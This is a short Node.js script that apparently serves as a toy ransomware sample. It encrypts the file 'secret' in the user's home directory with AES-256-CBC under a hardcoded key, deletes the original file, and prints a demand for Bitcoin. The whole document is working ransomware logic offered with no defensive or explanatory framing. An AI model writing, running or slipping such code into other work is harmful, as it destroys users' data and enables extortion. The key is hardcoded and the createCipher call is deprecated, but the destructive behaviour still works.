var fs = require('fs');
var os = require('os');
var path = require('path');
var crypto = require('crypto');


var key = '18311813';
var cipher = crypto.createCipher('aes-256-cbc', key);
var input = fs.createReadStream(path.join(os.homedir(), 'secret'));
var output = fs.createWriteStream(path.join(os.homedir(), 'secret.enc'));

input.pipe(cipher).pipe(output);

output.on('finish', function() {
  fs.unlink(path.join(os.homedir(), 'secret'),()=>{})
  console.log('Your File is Encrypted! Give me Bitcoin!');
});
